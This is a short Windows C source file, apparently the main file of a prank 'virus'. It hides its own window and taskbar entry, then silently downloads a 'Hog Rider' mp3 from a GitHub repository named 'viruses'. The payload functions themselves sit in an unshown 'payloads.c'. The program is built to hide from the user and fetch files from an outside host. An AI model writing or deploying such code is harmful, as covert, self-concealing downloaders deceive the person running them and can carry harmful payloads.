#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
// Local
#include "payloads.c"

int main(int argc, char *argv[])
{
    hideWindow();
    hideAppInTaskbar();

    // unsigned int threadId;
    // HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, showMsgBox, NULL, 0, &threadId);

    // WaitForSingleObject(hThread, INFINITE);
    // CloseHandle(hThread);

    downloadFile("https://github.com/rayorole/viruses/raw/main/hog-rider.mp3", "hogrider.mp3");

    return 0;
}